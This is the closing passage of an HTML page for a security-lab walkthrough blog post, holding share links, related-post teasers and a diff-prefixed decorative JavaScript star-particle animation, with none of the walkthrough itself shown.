<span>LinkedIn</span> </a><a href="https://buffer.com/add?text=TryHackme%20Soupedcode%20Walkthrough%C2%A0&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Ftryhackme-soupedcode-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=TryHackme%20Soupedcode%20Walkthrough%C2%A0 https%3A%2F%2Fh4ck3rfirst.github.io%2Ftryhackme-soupedcode-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/postman-installation-guide-on-kali-linux/" class="content__nav-link" rel="prev"><div><span>Previous</span> Postman Installation Guide on Kali Linux</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-variatype-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Variatype Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-06-06T08:11" class="feed__date">June 6, 2026</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough-3/">Tryhackme Operation Endgame Walkthrough </a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine 'Operation endgame hackthebox **Difficulty:** Medium **OS:** Windows (Active Directory) **Platform:** TryHackMe **Category:**&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-06-06T08:11" class="feed__date">June 6, 2026</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough-2/">Tryhackme Operation Endgame Walkthrough </a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine 'Operation endgame hackthebox **Difficulty:** Medium **OS:** Windows (Active Directory) **Platform:** TryHackMe **Category:**&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-06-06T08:11" class="feed__date">June 6, 2026</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough/">Tryhackme Operation Endgame Walkthrough </a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine 'Operation endgame hackthebox **Difficulty:** Medium **OS:** Windows (Active Directory) **Platform:** TryHackMe **Category:**&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
